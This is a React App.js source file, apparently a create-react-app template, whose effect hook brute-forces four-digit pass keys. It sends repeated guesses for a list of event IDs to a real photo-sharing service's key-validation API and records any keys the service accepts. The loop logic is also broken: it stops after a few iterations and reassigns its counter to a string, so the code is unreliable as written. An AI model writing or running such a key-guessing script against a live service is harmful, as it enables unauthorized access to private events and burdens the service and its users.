import logo from './logo.svg';
import './App.css';
import axios from 'axios'
import { useEffect } from 'react';

function App() {
  useEffect(()=>{
    data1()
  },[])
  const data1=async()=>{
    const id=[14158, 14334, 14522, 15512, 21170, 21971,25570, 25604, 27319, 27758, 30432,33075, 33076, 35460, 35661, 37855, 37868, 38309, 38872, 39144, 39574, 39762, 40025, 40707, 41647, 41733, 42606, 44391]
    const ids=id.map(id=>({id,password:0}))
    console.log(ids)
    try {
      for (let i = 0; i < 4;i++) {
        i=i.toString().padStart(4, '0')
        ids.forEach(async (v)=>{
          const res = await axios.get(`https://openapi.fotoowl.ai/open/event/validate-key?event_id=${v.id}&key=${i}`)
          if(res){
            if (res.data.data.is_valid !== false &&  res.data.data.key_type=== "pass_key") {
              v.password=i
            }else{
              console.log("level 1")
            }
          }
        })
        if(Number(i)===Number('9999')){
          console.log(ids,"password")
        }
      }
      console.log(ids)
    } catch (error) {
      console.log(error)
    }

  }
  return (
    <div className="App">
      <header className="App-header">
        <img src={logo} className="App-logo" alt="logo" />
        <p>
          Edit <code>src/App.js</code> and save to reload.
        </p>
        <a
          className="App-link"
          href="https://reactjs.org"
          target="_blank"
          rel="noopener noreferrer"
        >
          Learn React
        </a>
      </header>
    </div>
  );
}

export default App;
